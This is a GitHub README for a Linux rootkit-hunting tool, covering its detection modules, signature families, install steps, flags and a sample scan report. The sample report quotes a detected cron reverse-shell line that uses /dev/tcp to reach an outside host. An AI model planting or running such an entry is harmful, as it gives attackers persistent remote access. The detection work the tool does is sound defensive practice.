<div align="center">

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗ ██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗                      ║
║   ██╔══██╗██║ ██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝                      ║
║   ██████╔╝█████╔╝ ███████║██║   ██║██╔██╗ ██║   ██║                         ║
║   ██╔══██╗██╔═██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║                         ║
║   ██║  ██║██║  ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║                         ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    v2.5                ║
║                                                                              ║
║                    ⚡ Advanced Linux Rootkit Hunter ⚡                       ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

<p>
  <img src="https://img.shields.io/badge/version-2.5.0-00ff00?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/signatures-250%2B-ff0000?style=for-the-badge" alt="Signatures">
  <img src="https://img.shields.io/badge/modules-15-blue?style=for-the-badge" alt="Modules">
  <img src="https://img.shields.io/badge/license-MIT-purple?style=for-the-badge" alt="License">
</p>

<p>
  <a href="https://github.com/bad-antics/nullsec-rkhunt"><img src="https://img.shields.io/github/stars/bad-antics/nullsec-rkhunt?style=social" alt="Stars"></a>
  <a href="https://github.com/bad-antics"><img src="https://img.shields.io/badge/NullSec-Toolkit-000000?style=flat-square&logo=github" alt="NullSec"></a>
</p>

*Comprehensive Linux rootkit detection with modern threat signatures, eBPF analysis, memory forensics, and APT implant detection*

</div>

---

## 💻 Tech Stack

### Core
![C](https://img.shields.io/badge/C-A8B9CC?style=for-the-badge&logo=c&logoColor=black)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![POSIX](https://img.shields.io/badge/POSIX-000000?style=for-the-badge&logo=gnu&logoColor=white)

### Detection Targets
![eBPF](https://img.shields.io/badge/eBPF-FF6600?style=for-the-badge&logo=linux&logoColor=white)
![Kernel](https://img.shields.io/badge/Kernel-326CE5?style=for-the-badge&logo=linux&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![Kubernetes](https://img.shields.io/badge/K8s-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white)

### Platforms
![AMD64](https://img.shields.io/badge/AMD64-ED1C24?style=for-the-badge&logo=amd&logoColor=white)
![ARM64](https://img.shields.io/badge/ARM64-0091BD?style=for-the-badge&logo=arm&logoColor=white)
![Raspberry Pi](https://img.shields.io/badge/RPi-A22846?style=for-the-badge&logo=raspberrypi&logoColor=white)

---

## �� Features

<table>
<tr>
<td width="50%" valign="top">

### 🔬 Detection Modules (15)

| Module | Flag | Description |
|--------|:----:|-------------|
| **Process Analysis** | `-p` | Hidden processes via /proc vs kill() |
| **Library Injection** | auto | LD_PRELOAD, ld.so.preload hooks |
| **Kernel Modules** | `-m` | LKM rootkits, tainted kernel |
| **Filesystem** | `-f` | Rootkit files, SUID in temp |
| **Network** | `-n` | Backdoor ports, raw sockets |
| **Syscall Integrity** | `-s` | Kallsyms, kprobes, ftrace |
| **eBPF Analysis** | `-E` | BPF programs, suspicious mounts |
| **Boot Integrity** | `-b` | UEFI, initramfs, GRUB, MBR |
| **Container Security** | `-c` | Docker/K8s escapes, capabilities |
| **Persistence** | `-e` | Cron, systemd, SSH keys, PAM |
| **File Integrity** | `-I` | ELF validation, ownership |
| **Memory Analysis** | `-M` | RWX regions, injections |
| **MITRE ATT&CK** | `-A` | Map findings to ATT&CK TTPs |
| **Live Forensics** | `-F` | Volatile data collection |
| **Yara Scanning** | `-Y` | Custom Yara rule support |

</td>
<td width="50%" valign="top">

### 🦠 Signature Database (250+)

| Category | Count | Examples |
|----------|:-----:|----------|
| **LKM Rootkits** | 75+ | singularity, reptile, diamorphine, kovid |
| **APT Implants** | 25+ | turla, equation, regin, drovorub |
| **eBPF Threats** | 20+ | ebpfkit, bpfdoor, pamspy, boopkit |
| **Userland** | 40+ | jynx2, azazel, vlany, beurk |
| **Bootkits** | 40+ | blacklotus, moonbounce, cosmicstrand |
| **Container** | 30+ | kinsing, doki, siloscape, teamtnt |
| **Cryptominers** | 20+ | xmrig, coinhive, minergate |

</td>
</tr>
</table>

---

## 📦 Installation

```bash
# Clone
git clone https://github.com/bad-antics/nullsec-rkhunt
cd nullsec-rkhunt

# Compile
make

# Or manually:
gcc -O2 -Wall -o rkhunt src/rkhunt.c -lpthread -lcap -lyara

# Install system-wide
sudo make install
```

### Dependencies

```bash
# Debian/Ubuntu
sudo apt install libcap-dev libyara-dev

# Fedora/RHEL
sudo dnf install libcap-devel yara-devel

# Arch Linux
sudo pacman -S libcap yara
```

---

## 🚀 Usage

```bash
# Full comprehensive scan
sudo ./rkhunt -a

# Quick scan (processes, modules, preload)
sudo ./rkhunt -q

# Targeted modules
sudo ./rkhunt -m -s -E      # Modules + Syscalls + eBPF
sudo ./rkhunt -e -I -M      # Persistence + Integrity + Memory

# Advanced options
sudo ./rkhunt -a -A         # Include MITRE ATT&CK mapping
sudo ./rkhunt -a -F         # Live forensics mode
sudo ./rkhunt -a -Y rules/  # Custom Yara rules

# Output options
sudo ./rkhunt -a -v              # Verbose
sudo ./rkhunt -a -Q              # Quiet (alerts only)
sudo ./rkhunt -a -j              # JSON output
sudo ./rkhunt -a -x              # XML output
sudo ./rkhunt -a -l scan.log     # Log to file
sudo ./rkhunt -a -d              # Deep scan mode
sudo ./rkhunt -a --html report.html  # HTML report
```

### Command Reference

<details>
<summary>Click to expand all options</summary>

```
Scan Options:
  -a, --all           Full comprehensive scan (default)
  -q, --quick         Quick scan (processes, modules, preload)
  -p, --processes     Scan for hidden processes
  -m, --modules       Scan kernel modules
  -f, --files         Scan for rootkit files
  -n, --network       Check network backdoors
  -s, --syscalls      Check syscall table integrity
  -b, --boot          Check boot/UEFI/MBR integrity
  -c, --container     Container security checks
  -e, --persistence   Check persistence mechanisms
  -E, --ebpf          eBPF program analysis
  -I, --integrity     File integrity verification
  -M, --memory        Deep memory signature scan
  -A, --attack        MITRE ATT&CK TTP mapping
  -F, --forensics     Live forensics data collection
  -Y, --yara <dir>    Scan with custom Yara rules

Output Options:
  -v, --verbose       Verbose output
  -Q, --quiet         Minimal output (alerts only)
  -l, --log <file>    Log findings to file
  -j, --json          JSON output format
  -x, --xml           XML output format
  --html <file>       Generate HTML report
  -d, --deep          Enable deep scanning (slower)
  --no-color          Disable colored output

Remediation:
  --quarantine        Quarantine detected threats
  --kill              Kill suspicious processes
  --unload            Unload malicious modules
  --report-only       Report without remediation (default)
```

</details>

---

## 📊 Severity Levels

| Level | Icon | Exit Code | Description |
|-------|:----:|:---------:|-------------|
| **CRITICAL** | 🔴 | 2 | Active rootkit/compromise detected |
| **HIGH** | 🟠 | 1 | Strong indicators of compromise |
| **MEDIUM** | 🟡 | 0 | Suspicious activity, needs review |
| **LOW** | 🔵 | 0 | Minor anomalies, informational |
| **INFO** | ⚪ | 0 | Scan progress and system info |

---

## 🖥️ Sample Output

```
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                                              ┃
┃   ██████╗ ██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗  v2.5                ┃
┃   ██╔══██╗██║ ██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝                      ┃
┃   ██████╔╝█████╔╝ ███████║██║   ██║██╔██╗ ██║   ██║     Advanced            ┃
┃   ██╔══██╗██╔═██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║     Rootkit             ┃
┃   ██║  ██║██║  ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║     Hunter              ┃
┃   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝                        ┃
┃                                                                              ┃
┃   github.com/bad-antics/nullsec-rkhunt                                       ┃
┃                                                                              ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

┌─────────────────────────────────────────────────────────────────────────────┐
│  SYSTEM INFORMATION                                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│  Hostname    : compromised-server                                           │
│  Kernel      : Linux 6.5.0-generic x86_64                                   │
│  Uptime      : 45 days, 12:34:56                                            │
│  Scan Mode   : Full Comprehensive (-a)                                      │
│  Scan Time   : 2026-01-31 14:32:01 UTC                                      │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  MODULE: Kernel Analysis                                                    │
└─────────────────────────────────────────────────────────────────────────────┘
  [INFO]  Checking loaded kernel modules...
  [INFO]  Modules loaded: 127
  
  🔴 [CRITICAL] ROOTKIT_LKM
     Known rootkit module detected: reptile
     Path: /lib/modules/6.5.0-generic/kernel/drivers/reptile.ko
     ATT&CK: T1014 (Rootkit), T1547.006 (Kernel Modules)
     Action: Immediate removal required

┌─────────────────────────────────────────────────────────────────────────────┐
│  MODULE: Persistence Mechanisms                                             │
└─────────────────────────────────────────────────────────────────────────────┘
  [INFO]  Scanning cron directories...
  [INFO]  Scanning systemd units...
  
  🔴 [CRITICAL] CRON_BACKDOOR
     Reverse shell pattern detected in cron job
     File: /etc/cron.d/system-update
     Content: */5 * * * * root /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
     ATT&CK: T1053.003 (Scheduled Task/Job: Cron)
     Action: Remove malicious cron entry
     
  🟡 [MEDIUM] SSH_KEY_ANOMALY
     Unauthorized SSH key in root authorized_keys
     File: /root/.ssh/authorized_keys
     Key: ssh-rsa AAAA...suspicious...
     ATT&CK: T1098.004 (SSH Authorized Keys)
     Action: Verify key ownership

┌─────────────────────────────────────────────────────────────────────────────┐
│  MODULE: eBPF Analysis                                                      │
└─────────────────────────────────────────────────────────────────────────────┘
  [INFO]  Enumerating BPF programs...
  [INFO]  BPF programs found: 23
  
  🟠 [HIGH] SUSPICIOUS_BPF
     Unknown BPF program attached to syscall
     Program ID: 847
     Type: kprobe
     Target: sys_read
     ATT&CK: T1014 (Rootkit)
     Action: Investigate BPF program origin

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                                              ┃
┃                              SCAN RESULTS                                    ┃
┃                                                                              ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃                                                                              ┃
┃   🔴 Critical    │████████████████████████████████████│    2                 ┃
┃   🟠 High        │████████████████████                │    1                 ┃
┃   🟡 Medium      │████████████                        │    1                 ┃
┃   �� Low         │                                    │    0                 ┃
┃                                                                              ┃
┃   ─────────────────────────────────────────────────────────────              ┃
┃   Total Findings │████████████████████████████████████│    4                 ┃
┃   Scan Duration  │ 12.34 seconds                                             ┃
┃   Modules Run    │ 15/15                                                     ┃
┃                                                                              ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                                              ┃
┃   ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗                      ┃
┃   ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║                      ┃
┃   ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║                      ┃
┃   ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║                      ┃
┃   ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║                      ┃
┃   ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝                      ┃
┃                                                                              ┃
┃   ██████╗ ██████╗ ███╗   ███╗██████╗ ██████╗  ██████╗ ███╗   ███╗██╗███████╗ ┃
┃   ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██║██╔════╝ ┃
┃   ██║     ██║   ██║██╔████╔██║██████╔╝██████╔╝██║   ██║██╔████╔██║██║███████╗ ┃
┃   ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██║╚════██║ ┃
┃   ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║███████║ ┃
┃    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝╚══════╝ ┃
┃                                                                              ┃
┃   2 critical finding(s) detected - Immediate incident response recommended  ┃
┃                                                                              ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

┌─────────────────────────────────────────────────────────────────────────────┐
│  MITRE ATT&CK MAPPING                                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│  T1014      │ Rootkit                        │ 2 findings                   │
│  T1053.003  │ Scheduled Task/Job: Cron       │ 1 finding                    │
│  T1098.004  │ SSH Authorized Keys            │ 1 finding                    │
│  T1547.006  │ Boot/Logon: Kernel Modules     │ 1 finding                    │
└─────────────────────────────────────────────────────────────────────────────┘

Report saved to: /var/log/rkhunt/scan-20260131-143201.json
```

---

## 🆕 New in v2.5

### Enhanced Detection Capabilities

- **MITRE ATT&CK Integration** - Map all findings to ATT&CK TTPs
- **Live Forensics Mode** - Capture volatile data for incident response
- **Yara Rule Support** - Scan with custom Yara signatures
- **HTML Report Generation** - Professional reports for stakeholders
- **Remediation Actions** - Optional automatic threat removal
- **Cryptominer Detection** - 20+ mining malware signatures

### Improved Analysis

- **Memory-mapped file scanning** - Detect fileless malware
- **Process hollowing detection** - Identify injected processes
- **Kernel symbol verification** - Validate syscall table integrity
- **Container escape detection** - Docker/K8s breakout attempts
- **PAM backdoor scanning** - Authentication hook detection

---

## 🛡️ Part of NullSec Toolkit

<table>
<tr>
<td width="33%" valign="top">

### Core Security
- [nullsec-linux](https://github.com/bad-antics/nullsec-linux) — Full distro
- [nullsec-tools](https://github.com/bad-antics/nullsec-tools) — 135+ tools
- [nullsec-rkhunt](https://github.com/bad-antics/nullsec-rkhunt) — Rootkit hunter

</td>
<td width="33%" valign="top">

### Cloud & Container
- [nullsec-cloudaudit](https://github.com/bad-antics/nullsec-cloudaudit) — Multi-cloud
- [nullsec-k8sscan](https://github.com/bad-antics/nullsec-k8sscan) — Kubernetes
- [nullsec-terraform-scan](https://github.com/bad-antics/nullsec-terraform-scan) — IaC

</td>
<td width="33%" valign="top">

### Mobile & Hardware
- [nullkia](https://github.com/bad-antics/nullkia) — Mobile security
- [nullsec-canbus](https://github.com/bad-antics/nullsec-canbus) — CAN bus
- [nullsec-sdr](https://github.com/bad-antics/nullsec-sdr) — SDR analysis

</td>
</tr>
</table>

---

## 📝 Changelog

### v2.5.0 (2026-01-31)
- ✨ MITRE ATT&CK TTP mapping for all findings
- ✨ Live forensics data collection mode
- ✨ Yara rule support for custom signatures
- ✨ HTML report generation
- ✨ Optional remediation actions (quarantine, kill, unload)
- ✨ Cryptominer detection (20+ signatures)
- ✨ PAM backdoor scanning
- ✨ Process hollowing detection
- 🦠 50+ new signatures (total: 250+)
- 🎨 Completely redesigned output formatting
- 🐛 Fixed false positives in container environments

### v2.0.0
- Complete rewrite with modular architecture
- 150+ rootkit signatures
- Container security checks
- eBPF analysis module

---

## 🔗 Connect

<div align="center">

[![Website](https://img.shields.io/badge/bad--antics.github.io-000000?style=for-the-badge&logo=github&logoColor=white)](https://bad-antics.github.io/)

</div>

---

<div align="center">

*For authorized security testing and research only.*

**© 2024-2026 bad-antics • NullSec Security Engineering**

</div>
